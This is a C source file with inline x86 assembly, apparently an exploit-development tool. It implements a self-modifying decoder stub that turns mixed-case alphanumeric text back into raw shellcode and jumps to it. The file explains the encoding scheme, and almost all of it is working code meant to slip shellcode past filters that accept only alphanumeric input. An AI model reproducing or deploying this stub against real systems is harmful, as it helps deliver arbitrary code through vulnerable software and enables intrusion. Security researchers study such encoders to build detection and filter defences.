/*
  Mixedcase, alphanumeric, shellcode decoder.
  (C) Copyright 2003, 2004 Berend-Jan Wever

  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

  Thanks to rix for his phrack article on aphanumeric shellcode.

  Pre-execution requirements:
    %ecx = %edx = baseaddress of code.
  Short description:
    The code will "xor-patch" it's own last bytes into a decoder loop, this
    decoder loop will then convert the string behind it from alphanumeric
    characters back to the origional shellcode untill it reaches the
    character 'A'. Execution is transfered to the decoded shellcode.
  Encoding scheme for origional shellcode:
    Every byte 0xAB is encoded in two bytes:  0xCD and 0xEF
    Where F = B and E is arbitrary (3-7) as long as EF is alphanumeric,
    D = A^E and C is arbitrary (3-7) as long as CD is alphanumeric.
    The encoded data is terminated by a "A" (0x41) character, DO NOT USE THIS
    in your encoded shellcode data, as it will stop the decoding!
*/


int main(void) {
  __asm__(
    // output the code to stdout
      "  mov     $end-start, %edx       \n" // length
      "  mov     $start, %ecx           \n" // source
      "  mov     $0x1, %ebx             \n" // stdout
      "  mov     $0x4, %eax             \n" // write
      "  int     $0x80                  \n"
      "  jmp     end                    \n"
    "start:                             \n"

      "  push     %ecx                  \n"
      "  xor      $0x53, %al            \n" 
      "  .byte    'K','Y','L','I','N','E','D' \n"
      "  xor      $0x20, %al            \n" 
      "  push     %ecx                  \n"
      "  pop      %edx                  \n"
// XOR-patching ---------------------------------------------------------------
      "  push     $0x20614265           \n"
      "  pop      %eax                  \n" // ah = 42, al = 41
      "  xor      $0x65, %al            \n" // al = 0
      "  dec      %eax                  \n" // ah = 41, al = ff
      "  push     %eax                  \n"
      "  xor      %ah, 0x20(%ecx)       \n" // decode 0x10 for imul instruction

      // loop:
      "  inc      %ecx                  \n" 
      " .byte 0x6b, 0x44, 0x51, 0x34, 0x51 \n" // 6B41 30 10      IMUL    EAX, [ECX+30], 10
      "  xor      0x35(%ecx), %al       \n" // al = decoded byte
      "  xor      0x35(%edx), %al       \n"
      "  xor      %al, 0x35(%edx)       \n" // destination = decoded byte
      "  pop      %eax                  \n"
      "  and      %al, 0x20(%ecx)       \n" // nops to add spaces
      "  inc      %edx                  \n" 
      "  push     %eax                  \n"
      // skip:
      "  inc      %ecx                  \n" 
      "  cmp      %ah, 0x35(%ecx)       \n"
      " .byte     0x77, 0x6A, 0x46      \n" // 77 E6           JA    loop
      " .byte     0x51, 0x62, 0x68, 0x78 \n" // 72 F8           JB    skip
      " .byte     0x2e, 0x20            \n" // nops
      " .byte     0x6A, 0x6C            \n" // CC              INT   3
      " .byte     0x20                  \n" // nops
      " .byte     0x41                  \n" // terminator
      "end:                             \n"
  );
 exit(0);
}
